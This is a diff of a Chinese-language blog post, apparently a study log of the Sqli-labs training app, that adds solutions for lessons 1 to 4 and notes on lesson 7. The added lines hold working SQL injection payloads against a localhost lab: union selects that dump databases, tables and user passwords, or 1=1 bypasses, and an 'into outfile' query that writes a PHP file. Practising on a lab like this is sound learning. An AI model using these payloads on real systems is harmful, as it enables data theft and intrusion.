@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="KarmA&#39;s Blog">
 <meta property="og:description" content="边学边记，Sqli-labs">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-05T10:38:15.680Z">
+<meta property="og:updated_time" content="2018-02-10T14:42:55.820Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL Injection - Sqli-labs">
 <meta name="twitter:description" content="边学边记，Sqli-labs">
@@ -315,15 +315,43 @@
 
 <h2 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h2><h3 id="less-1-GET-Error-based-Single-quotes-String"><a href="#less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="less-1 GET - Error based - Single quotes - String"></a>less-1 GET - Error based - Single quotes - String</h3><p>(基于错误的GET单引号字符型注入)</p>
 <h4 id="查询（union）"><a href="#查询（union）" class="headerlink" title="查询（union）"></a>查询（union）</h4><p>当函数mysql_fetch_array只被调用了一次时，且想显示非第一行查询的数据库数据时，可以让第一行的查询结果为空，那么，非第一行（union右边）的查询结果自然就成了第一行。</p>
+<p><strong>union的作用是将两个sql语句进行联合。union前后的两个sql语句的选择列数要相同才可以（用order by查询行数） 。Union all与union 的区别是增加了去重的功能</strong></p>
 <h4 id="数据库连接函数"><a href="#数据库连接函数" class="headerlink" title="数据库连接函数"></a>数据库连接函数</h4><p>concat和concat_ws</p>
 <p>其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group__concat(可以把查询出来的多行连接起来)</p>
 <h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><p>查询information_schema中的信息时，使用where语句，那个值不能直接用英文，要用单引号包裹着，当然用其十六进制表示也可以，数值类型的就不用单引号了</p>
 <h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>查表时也只能返回一个table，所以要用limit来控制结果集具体是哪一行</p>
+<h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,2,3 –+</p>
+<p>爆库：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(schema_name),3 from information_schema.schemata–+</p>
+<p>爆表：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>爆列：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+</p>
+<p>爆数据：<a href="http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-1/index.php/?id=0&#39;union</a> select 1,username,password from users where id =3–+</p>
 <h3 id="less-2-GET-Error-based-Intiger-based"><a href="#less-2-GET-Error-based-Intiger-based" class="headerlink" title="less-2 GET - Error based - Intiger based"></a>less-2 GET - Error based - Intiger based</h3><p> (基于错误的GET整型注入)</p>
 <p>跟less1一样，只是不用闭合‘</p>
+<h4 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1</p>
+<p><a href="http://localhost/sqli-labs/Less-2/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-2/index.php/?id=1</a> or 1=1–+</p>
 <h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="less-3 GET - Error based - Single quotes with twist string"></a>less-3 GET - Error based - Single quotes with twist string</h3><p>(基于错误的GET单引号变形字符型注入)</p>
 <p>多了 <strong>‘)</strong> 那么sql语句里的id 应该就是 (‘$id’) 这样！</p>
-<h3 id="less-3-GET-Error-based-Double-Quotes-String"><a href="#less-3-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-3 GET - Error based - Double Quotes - String"></a>less-3 GET - Error based - Double Quotes - String</h3><p>（基于错误的GET双引号字符型注入） </p>
+<h4 id="solution-2"><a href="#solution-2" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1</a>‘) or ‘1’=(‘1’</p>
+<p><a href="http://localhost/sqli-labs/Less-3/index.php/?id=1′" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-3/index.php/?id=1′</a>) –+</p>
+<h3 id="less-4-GET-Error-based-Double-Quotes-String"><a href="#less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="less-4 GET - Error based - Double Quotes - String"></a>less-4 GET - Error based - Double Quotes - String</h3><p>(基于错误的GET双引号字符型注入) </p>
+<p>php中双引号可以包含单引号，所以判断是否存在注入时，还需要用 <strong>“</strong> 来判断</p>
+<h4 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h4><p>Payload:<a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) –+</p>
+<p>or</p>
+<p><a href="http://localhost/sqli-labs/Less-4/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-4/index.php/?id=1</a>“) or “1”=(“1</p>
+<h3 id="less-5-GET-Double-Injection-Single-Quotes-String"><a href="#less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="less-5 GET - Double Injection - Single Quotes - String"></a>less-5 GET - Double Injection - Single Quotes - String</h3><p>(双注入GET单引号字符型注入)</p>
+<h3 id="less-6-GET-Double-Injection-Double-Quotes-String"><a href="#less-6-GET-Double-Injection-Double-Quotes-String" class="headerlink" title="less-6 GET - Double Injection - Double Quotes - String"></a>less-6 GET - Double Injection - Double Quotes - String</h3><p>(双注入GET双引号字符型注入)</p>
+<h3 id="less-7-GET-Dump-into-outfile-String"><a href="#less-7-GET-Dump-into-outfile-String" class="headerlink" title="less-7 GET - Dump into outfile - String"></a>less-7 GET - Dump into outfile - String</h3><p>(导出文件GET字符型注入)</p>
+<p>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</p>
+<p>outfile函数将数据库中的内容写到一个文件中</p>
+<p>dumpfile只能使用一行</p>
+<p>load_file函数用来从文件系统中将文件导入到mysql中</p>
+<p>虽然有相应数据库权限，也对路径进行了转义，但是还是没有成功导出文件，尝试导出在tmp文件夹，发现也不行。先放着吧！</p>
+<p><a href="http://localhost/sqli-labs/Less-7/index.php/?id=1" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-7/index.php/?id=1</a>‘)) union select 1,2,3 into outfile “C:\phpStudy\tmp\1.php” %23 </p>
+<h3 id="less-8-GET-Blind-Boolian-Based-Single-Quotes"><a href="#less-8-GET-Blind-Boolian-Based-Single-Quotes" class="headerlink" title="less-8 GET - Blind - Boolian Based - Single Quotes"></a>less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>(布尔型单引号GET盲注)</p>
 </the></excerpt>
       
     </div>
@@ -335,7 +363,7 @@
         <p><span>本文标题:</span><a href="/2018/02/05/sqlinjection-sqlilabs/">SQL Injection - Sqli-labs</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">KarmA</a></p>
         <p><span>发布时间:</span>2018-02-05, 18:15:13</p>
-        <p><span>最后更新:</span>2018-02-05, 18:38:15</p>
+        <p><span>最后更新:</span>2018-02-10, 22:42:55</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/02/05/sqlinjection-sqlilabs/" title="SQL Injection - Sqli-labs">http://akkayin.github.io/2018/02/05/sqlinjection-sqlilabs/</a>
             <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2018/02/05/sqlinjection-sqlilabs/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -365,7 +393,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-labs"><span class="toc-text">Sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1-GET-Error-based-Single-quotes-String"><span class="toc-text">less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询（union）"><span class="toc-text">查询（union）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库连接函数"><span class="toc-text">数据库连接函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查表"><span class="toc-text">查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-text">limit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based"><span class="toc-text">less-2 GET - Error based - Intiger based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">less-3 GET - Error based - Single quotes with twist string</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Double-Quotes-String"><span class="toc-text">less-3 GET - Error based - Double Quotes - String</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-labs"><span class="toc-text">Sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1-GET-Error-based-Single-quotes-String"><span class="toc-text">less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询（union）"><span class="toc-text">查询（union）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库连接函数"><span class="toc-text">数据库连接函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查表"><span class="toc-text">查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based"><span class="toc-text">less-2 GET - Error based - Intiger based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-1"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">less-3 GET - Error based - Single quotes with twist string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-2"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4-GET-Error-based-Double-Quotes-String"><span class="toc-text">less-4 GET - Error based - Double Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-3"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-5-GET-Double-Injection-Single-Quotes-String"><span class="toc-text">less-5 GET - Double Injection - Single Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-6-GET-Double-Injection-Double-Quotes-String"><span class="toc-text">less-6 GET - Double Injection - Double Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-7-GET-Dump-into-outfile-String"><span class="toc-text">less-7 GET - Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-text">less-8 GET - Blind - Boolian Based - Single Quotes</span></a></li></ol></li></ol>
         
     </div>
     <style>
